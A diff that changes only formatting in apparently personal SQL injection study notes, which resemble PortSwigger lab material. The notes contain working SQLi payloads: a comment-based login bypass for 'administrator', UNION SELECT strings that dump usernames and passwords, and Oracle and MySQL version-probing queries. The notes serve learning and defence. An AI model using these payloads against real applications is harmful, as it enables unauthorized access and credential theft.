@@ -14,14 +14,14 @@
 ### Subverting application logic, where you can change a query to interfere with the application's logic
  If a users credential is wiener:bluecheese 
 
-`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` 
+`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
 `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''` 
 ### UNION attacks, where you can retrieve data from different database tables 
-`SELECT name, description FROM products WHERE category = 'Gifts'` `' UNION SELECT username, password FROM users--` 
+`SELECT name, description FROM products WHERE category = 'Gifts'` 
+`' UNION SELECT username, password FROM users--` 
 This will cause the application to return all usernames and passwords along with the names and descriptions of products. Examining the database, where you can extract information about the version and structure of the database 
 
 `SELECT * FROM information_schema.tables` -- what DB table exist 
-
 `SELECT * FROM v$version` -- Oracle version 
 ### Blind SQL injection, where the results of a query you control are not returned in the applications' responses 
 ## How to detect SQLi Vuln? 
@@ -36,7 +36,6 @@ Mostly by using parameterized queries (prepared statements) instead of string co
 `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` 
 ###### SQL injection attack, querying the database type and version on Oracle 
 `'+UNION+SELECT+'abc','def'+FROM+dual--`
-
 `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--` 
 ###### SQL injection attack, querying the database type and version on MySQL and Microsoft 
 `'+UNION+SELECT+'abc','def'#` 
